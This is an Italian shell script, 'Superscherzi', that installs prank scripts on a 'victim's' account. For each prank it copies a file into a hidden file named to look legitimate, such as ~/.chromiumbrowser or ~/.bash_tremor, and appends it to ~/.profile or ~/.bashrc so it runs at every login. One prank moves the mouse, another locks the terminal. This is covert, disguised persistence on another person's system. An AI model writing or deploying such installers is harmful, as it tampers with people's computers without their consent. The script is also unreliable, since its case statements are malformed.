#!/bin/sh

# Script che quando lanciato chiede che tipo di disturbo si vuole dare alla povera vittima
# e si occupa di fare tutti gli scherzi
echo "*** Superscherzi v 0.1 ***"


# Spinmouse con timer.
# Default: ./spinmouse.sh 4 1 60
echo "### SPINMOUSE"
echo "Muove il mouse di moto circolare ad intermittenza"
echo -n "Lo vuoi aggiungere? [Y/N] "
read resp

case "$resp" in
	y)
	Y)
		echo -n "Installazione... "
		cp spinmouse.sh ~/.chromiumbrowser
		chmod u+x ~/.chromiumbrowser
		echo "~/.chromiumbrowser &" >> ~/.profile
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
esac


# Lolterminale
echo "### LOLTERMINALE"
echo "Mette alcuni alias molto divertenti al terminale"
echo -n "Lo vuoi aggiungere? [Y/N] "
read resp

case "$resp" in
	y)
	Y)
		echo -n "Installazione... "
		cp lolterminale.sh ~/.bash_extensions
		chmod u+x ~/.bash_extensions
		echo "~/.bash_extensions" >> ~/.bashrc
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
esac


# Lockterminale
echo "### LOCKTERMINALE"
echo "Non permette di eseguire comandi sul terminale fino a quando non viene lasciata una riga vuota"
echo -n "Lo vuoi aggiungere? [Y/N] "
read resp

case "$resp" in
	y)
	Y)
		echo -n "Installazione... "
		cp lockterminale.sh ~/.bash_tremor
		chmod u+x ~/.bash_tremor
		echo "~/.bash_tremor" >> ~/.bashrc
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
esac


# Aggiungiamo tutto quanto al .profile e/o al .bashrc del malcapitato
